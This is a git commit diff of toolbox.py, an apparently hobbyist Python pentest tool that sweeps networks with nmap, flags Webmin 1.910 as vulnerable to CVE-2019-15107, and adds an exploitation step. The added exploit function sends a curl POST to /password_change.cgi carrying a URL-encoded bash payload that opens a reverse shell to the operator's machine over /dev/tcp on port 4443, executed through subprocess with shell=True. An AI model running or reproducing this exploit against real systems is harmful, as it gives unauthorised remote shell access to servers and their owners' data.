e525ad1d526673d18a35e6371725bc58ac9bc353
Spiritix <77000299+SpiritixCS@users.noreply.github.com>
2024-05-01 01:21:02 +0200

    Update toolbox.py

--- toolbox.py
+++ toolbox.py
@@ -5,15 +5,13 @@ import subprocess
 import ipaddress
 import sys
 import argparse
+import netifaces as ni
 from tqdm import tqdm
-
-
 
 BLUE = "\033[94m"
 GREEN = "\033[92m"
 RED = "\033[31m"
 ENDC = "\033[0m"
-
 
 def display_banner():
     banner = """
@@ -28,6 +26,26 @@ def display_banner():
     print(BLUE + banner + ENDC)
 
 
+
+def get_current_ip():
+    try:
+        # Get a list of network interfaces
+        interfaces = ni.interfaces()
+        
+        # Iterate over the network interfaces
+        for interface in interfaces:
+            # Get the IP addresses associated with the interface
+            addresses = ni.ifaddresses(interface)
+            if ni.AF_INET in addresses:
+                # Check if the interface has an IPv4 address
+                ip_info = addresses[ni.AF_INET][0]
+                lhost = ip_info['addr']
+                
+                # Skip loopback and link-local addresses
+                if not lhost.startswith('127.') and not lhost.startswith('169.254.'):
+                    return lhost
+    except Exception as e:
+        print("Error:", e)
 
 # Function to validate an IP address
 def validate_ip_address(ip_address):
@@ -56,9 +74,7 @@ def choose_scan_type():
         sys.exit(1)
 
 def ask_ip_range(scan_type):
-
     if scan_type == "i":
-
         while True:
             adresse_ip = input(ENDC + "Entrez une adresse IP : ")
             if validate_ip_address(adresse_ip):
@@ -66,7 +82,6 @@ def ask_ip_range(scan_type):
                 break
             else:
                 print(RED +"Format d'adresse IP invalide. Veuillez entrer une adresse IP valide.")
-   
     elif scan_type == "r":
         while True:
             network_range = input(ENDC + "Entrez une adresse réseau (192.168.1.0/24) : ")
@@ -75,38 +90,30 @@ def ask_ip_range(scan_type):
                 break
             else:
                 print(RED +"Format d'adresse réseau invalide. Veuillez entrer une adresse valide.")
-    
 
 def net_fullscan_ask():
-    net_fullscan_asking = input(ENDC + "Souhaitez vous effecture un scan en profondeur pour chauqe hote découvert ? (O/n)").lower()
-
+    net_fullscan_asking = input(ENDC + "Souhaitez vous effecture un scan en profondeur pour chaque hote découvert ? (O/n)").lower()
     if net_fullscan_asking == "o" or net_fullscan_asking == "":
         net_fullscan = True
     else:
         net_fullscan = False
-
     return net_fullscan
-
 
 # Function to perform a simple port scan
 def simple_scan():
-    
     result_list = []
     scanner = nmap.PortScanner()
-
     try:
-        scanner.scan(adresse_ip, arguments='-T5 -Pn -p 8888')
+        scanner.scan(adresse_ip, arguments='-T5 -Pn -p 8888,10000,8080')
     except nmap.PortScannerError as e:
         print("Erreur lors de l'analyse de l'adresse IP :", e)
         return None, None
-
     for host in scanner.all_hosts():
         if 'tcp' in scanner[host]:
             for port in scanner[host]['tcp'].keys():
                 state = scanner[host]['tcp'][port]['state']
                 if state == 'open':
                     result_list.append(port)
-
     try:
         if not (result_list):
             raise ValueError(RED + "❌ No open port found on the specified host." + ENDC)
@@ -117,19 +124,15 @@ def simple_scan():
         print(ve)
         sys.exit(1)
 
-
 def network_simple_scan(network_range):
     hosts_list = []
     scanner = nmap.PortScanner()
-
     try:
         scanner.scan(network_range, arguments='-T5 -sn -PU -PS -PA')
     except nmap.PortScannerError as e:
         print("Erreur lors de l'analyse du réseau :", e)
         sys.exit(1)
         return None, None
-        
-
     for host in scanner.all_hosts():
         hosts_list.append(host)
         hostcount = len(hosts_list)
@@ -139,203 +142,147 @@ def network_simple_scan(network_range):
         else :
             print (BLUE + f"Available Hosts:{ENDC}\n{hosts_list}\n")
             print (BLUE + f"Nobre d'hotes : {hostcount}")
-
         return network_range and hosts_list
-    
     except ValueError as ve:
         print(ve)
         sys.exit(1)
 
-
 # Function to perform a detailed port scan
-def better_scan(adresse_ip, result_list):
-    scanner_ports = nmap.PortScanner()
-    arguments = '-A -p ' + ','.join(map(str, result_list))
-    scanner_ports.scan(adresse_ip, arguments=arguments)
-    report = []
-
-    for port in result_list:
-        if 'tcp' in scanner_ports[adresse_ip]:
-            port_info = scanner_ports[adresse_ip]['tcp'][port]
-            cpe = port_info.get('cpe', 'N/A')
-
-            if 'linux' in cpe.lower() or 'windows' in cpe.lower():
-                cpe = ''
-            
-            report_entry = {
-                'Port': port,
-                'State': port_info['state'],
-                'Service': port_info['name'],
-                'Version': port_info['version'],
-                'CPE': cpe,
-                'CVEs': []
-            }
-
-            if cpe:
-                cves = get_cves_from_nvd(cpe)
-                report_entry['CVEs'] = cves
-                print("CVEs:")
-                cves_with_scores = []
-                for cve in cves:
-                    cvss_score = get_cvss_score(cve)
-                    cves_with_scores.append((cve, cvss_score))
-                cves_with_scores.sort(key=lambda x: (x[1] is None, x[1] if x[1] is not None else float('inf')), reverse=True)  # Sort CVEs by CVSS score in descending order, handling None values
-                for cve, cvss_score in cves_with_scores:
-                    print(f"CVE: {cve} (CVSS Score: {cvss_score})")
-
-            report.append(report_entry)
-    print(report_entry)
-    
-    if 'http' in  cpe.lower() or 'httpd' in cpe.lower() or 'http' in (report_entry['Service']) or 'httpd' in (report_entry['Service']):
-        http_enum(adresse_ip, port)
-
-    return report
-
-
-def network_fullscan(net_fullscan, hosts_list):
-    result_dict_nw = {}  # Dictionnaire pour stocker les ports découverts pour chaque adresse IP
-
-    if net_fullscan == True:
-        print("ok")
-        # Create a tqdm progress bar with the total number of hosts
-        print(BLUE + f"Début du scan de ports sur {len(hosts_list)} hôtes" + ENDC)
-        with tqdm(total=len(hosts_list)) as pbar:
-            for hote in hosts_list:
-                scanner = nmap.PortScanner()
-            
-                try:
-                    scanner.scan(hote, arguments='-T5 -Pn -p 8000,8080')
-                except nmap.PortScannerError as e:
-                    print("Erreur lors de l'analyse de l'adresse IP :", e)
-                    return None, None
-
-                for host in scanner.all_hosts():
-                    if 'tcp' in scanner[host]:
-                        for port in scanner[host]['tcp'].keys():
-                            state = scanner[host]['tcp'][port]['state']
-                            if state == 'open':
-                                if host not in result_dict_nw:
-                                    result_dict_nw[host] = []  # Initialise une liste vide pour cette adresse IP
-                                result_dict_nw[host].append(port)
-
-                # Update the progress bar
-                pbar.update(1)
-
-            print(f"\n")
-        print(result_dict_nw)
-    else:
-        try:
-            raise ValueError(RED + "❌ Pas de scans avancés des hôtes.")
-        except ValueError as ve:
-            print(ve)
-            sys.exit(1)
-
-                 
-
-
-# Function to perform HTTP enumeration
-def http_enum(adresse_ip, port):
-    dirb_result_final = []
-    dirb_result_str = ""
-    print (GREEN + f"Début de l'énumération web pour http://{adresse_ip}:{port}")
-            
-    command = f"dirb http://{adresse_ip}:{port} ~/Applications/dirb222/wordlists/common.txt"
-    dirb_result = subprocess.check_output(command, shell=True, text=True)
-    filename = f"dirb-{adresse_ip}.txt"
-    for line in dirb_result.splitlines():
-        if "CODE" in line:
-            dirb_result_final.append(line)
-
-    dirb_result_str = ' '.join(dirb_result_final)
-    dirb_final = dirb_result_str.replace("+", "\n+")
-    with open(filename, "w") as file:
-        file.write(dirb_final)
-    if dirb_final == "":
-        print(RED + "No directory found.\n" + ENDC )
-    else: 
-        print(dirb_final)
-
-
-# Function to retrieve CVEs from NVD
-def get_cves_from_nvd(cpe):
-    url = 'https://services.nvd.nist.gov/rest/json/cves/1.0'
-    params = {
-        'cpeMatchString': cpe
-    }
+def better_scan(adresse_ip, open_ports):
+    result_dict = {}  # Dictionary to store scan results for each IP
+    scanner = nmap.PortScanner()
 
     try:
-        response = requests.get(url, params=params)
-        response.raise_for_status()
-        data = response.json()
-        cve_entries = data.get('result', {}).get('CVE_Items', [])
-        cves = [entry['cve']['CVE_data_meta']['ID'] for entry in cve_entries]
-        return cves
-    except requests.exceptions.RequestException as e:
-        print(RED + f"Error: {e}" + ENDC)
-        return []
-
-
-# Function to retrieve CVSS score for a CVE
-def get_cvss_score(cve):
-    url = f'https://services.nvd.nist.gov/rest/json/cve/1.0/{cve}'
-    try:
-        response = requests.get(url)
-        response.raise_for_status()
-        data = response.json()
-        cvss_v3_score = data.get('result', {}).get('CVE_Items', [])[0].get('impact', {}).get('baseMetricV3', {}).get('cvssV3', {}).get('baseScore')
-        if cvss_v3_score is None:
-            cvss_v2_score = data.get('result', {}).get('CVE_Items', [])[0].get('impact', {}).get('baseMetricV2', {}).get('cvssV2', {}).get('baseScore')
-            return cvss_v2_score
-        return cvss_v3_score
-    except requests.exceptions.RequestException as e:
-        print(RED + f"Error: {e}" + ENDC)
+        scanner.scan(adresse_ip, arguments='-A')  # Use '-A' for aggressive scan
+    except nmap.PortScannerError as e:
+        print(f"Error scanning host {adresse_ip}: {e}")
         return None
 
+    for port in open_ports:
+        try:
+            # Extract scan results
+            scan_result = scanner[adresse_ip]['tcp'][port]
+            protocol = 'tcp'
+            port_number = port
+            service_name = scan_result['name']
+            state = scan_result['state']
+            product = scan_result['product'] if 'product' in scan_result else None
+            extra_info = scan_result['extrainfo'] if 'extrainfo' in scan_result else None
+            version = scan_result['version'] if 'version' in scan_result else None
+            
+            # Print scan results
+            print(GREEN + f"  Port: {port_number}" + ENDC)
+            print(f"    Service: {service_name}")
+            print(f"    State: {state}")
+            print(f"    Product: {product}")
+            print(f"    Version: {version}")
+            print(f"    Extra Info: {extra_info}")
+            
+            # Check for CVE-2019-15107 vulnerability
+            vulnerability_detected = check_CVE_2019_15107_vulnerability(service_name, extra_info, version)
+            
+            # Store scan results in the dictionary
+            if adresse_ip not in result_dict:
+                result_dict[adresse_ip] = {'hostname': scanner[adresse_ip].hostname(),
+                                            'ports': {}}
+            result_dict[adresse_ip]['ports'][port_number] = {'protocol': protocol,
+                                                             'name': service_name,
+                                                             'state': state,
+                                                             'product': product,
+                                                             'extrainfo': extra_info,
+                                                             'version': version,
+                                                             'vulnerability_detected': vulnerability_detected}
+            
+        except nmap.PortScannerError as e:
+            print(f"Error scanning port {port}:", e)
+            
+    return result_dict
 
-# Function to export the scan report to a CSV file
-def export_to_csv(report, adresse_ip):
-    export_report = input("Souhaitez-vous exporter le rapport dans un fichier CSV ? (o/n)\n")
-    if export_report.lower() == 'o':
-        filename = adresse_ip + ".csv"
-
-        with open(filename, mode='w', newline='') as file:
-            writer = csv.writer(file)
-            writer.writerow(['Port', 'State', 'Service', 'Version', 'CPE', 'CVE', 'CVSS Score'])
-
-            for port_info in report:
-                cves = port_info['CVEs']
-                if cves:
-                    cves_with_scores = []
-                    for cve in cves:
-                        cvss_score = get_cvss_score(cve)
-                        cves_with_scores.append((cve, cvss_score))
-                    cves_with_scores.sort(key=lambda x: (x[1] is None, x[1] if x[1] is not None else float('inf')), reverse=True)  # Sort CVEs by CVSS score in descending order, handling None values
-                    for cve, cvss_score in cves_with_scores:
-                        # Include the CPE in the CSV
-                        writer.writerow([port_info['Port'], port_info['State'], port_info['Service'], port_info['Version'], port_info['CPE'], cve, cvss_score])
+def network_fullscan(net_fullscan, hosts_list):
+    result_dict_nw = {}  # Dictionary to store detailed scan results for each IP
+    if net_fullscan:
+        print("Starting deep scan on each host and port discovered...")
+        with tqdm(total=len(hosts_list)) as pbar:
+            for host in hosts_list:
+                scanner = nmap.PortScanner()
+                try:
+                    scanner.scan(host, arguments='-T5 -Pn -p 8080,10000')
+                except nmap.PortScannerError as e:
+                    print(f"Error scanning host {host}: {e}")
+                    continue
+                open_ports = [p for p in scanner[host]['tcp'].keys() if scanner[host]['tcp'][p]['state'] == 'open']
+                if not open_ports:
+                    open_ports_str = "none"
                 else:
-                    # If there are no CVEs, write an empty row with the port information and CPE
-                    writer.writerow([port_info['Port'], port_info['State'], port_info['Service'], port_info['Version'], port_info['CPE'], '', ''])
+                    open_ports_str = ", ".join(map(str, open_ports))
+                print(f"Open ports for host {host}: {open_ports_str}")
+                if open_ports:
+                    result_dict_nw[host] = better_scan(host, open_ports)
+                pbar.update(1)
 
-        print(GREEN + "\nLe rapport a été exporté dans le fichier CSV.")
+def check_CVE_2019_15107_vulnerability(service_name, extra_info, version):
+    if ('service' in service_name.lower() or 'webmin' in extra_info.lower()) and '1.910' in version:
+        print(GREEN + "Vulnerability CVE-2019-15107 detected!" + ENDC)
+        return True
+    else:
+        print(RED + "Vulnerability CVE-2019-15107 not detected!" + ENDC)
+        return False
 
+def ask_exploitation_phase():
+    while True:
+        choice = input("Do you want to proceed to the exploitation phase? (y/N): ").strip().lower()
+        if choice in ['y', 'yes']:
+            return True
+        elif choice in ['', 'n', 'no']:
+            return False
+        else:
+            print("Invalid choice. Please enter 'Y' or 'N'.")
 
+def exploit_CVE_2019_15107(result_dict,lhost):
+    for target_ip, details in result_dict.items():
+        for port, port_details in details['ports'].items():
+            if port_details['vulnerability_detected']:
+                target_port = port 
+                lport = "4443"
+                vuln_path = "/password_change.cgi"
 
+                exploit_cmd = (
+                    f"curl -sk -X POST 'https://{target_ip}:{target_port}{vuln_path}' "
+                    "-H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.47' "
+                    f"-H 'Referer: https://{target_ip}:{target_port}/' "
+                    "-H 'Content-Type: application/x-www-form-urlencoded' "
+                    f"-d 'expired=bash%20-c%20%270%3c%2666-%3bexec%2066%3c%3e/dev/tcp/{lhost}/{lport}%3bsh%20%3c%2666%20%3e%2666%202%3e%2666%27&new1=SmKUYgMFtixFlLt6nggby&new2=SmKUYgMFtixFlLt6nggby&old=bash%20-c%20%270%3c%2666-%3bexec%2066%3c%3e/dev/tcp/{lhost}/{lport}%3bsh%20%3c%2666%20%3e%2666%202%3e%2666%27'"
+                )
+                try:
+                    subprocess.run(
+                        exploit_cmd, shell=True, check=True, timeout=3
+                    )
+                except subprocess.TimeoutExpired:
+                    print(f"Exploit attempt done, reverse shell sent to Villain {lhost}")
+                finally:
+                    print("Script ended.")
+
+# Prompt for user input
 display_banner()
 scan_type = choose_scan_type()
 
+# Prompt for network range scan
 if scan_type == "r":
     network_range = ask_ip_range(scan_type)
     hosts_list = network_simple_scan(network_range)
     net_fullscan = net_fullscan_ask()
-    if net_fullscan == True:
-        network_fullscan(net_fullscan,hosts_list)
+    if net_fullscan:  # Check if net_fullscan is True
+        network_fullscan(net_fullscan, hosts_list)
 
-
+# Prompt for single IP scan
 else:
     adresse_ip = ask_ip_range(scan_type)
     result_list = simple_scan()
+    # Perform the detailed scan and export results to CSV
+    result_dict = better_scan(adresse_ip, result_list)
 
-    #Perform the detailed scan and export results to CSV
-    report = better_scan(adresse_ip, result_list)
-    export_to_csv(report, adresse_ip)
+if ask_exploitation_phase():
+    lhost = get_current_ip()
+    exploit_CVE_2019_15107(result_dict, lhost)
+else:
+    print("Exploitation phase skipped.")
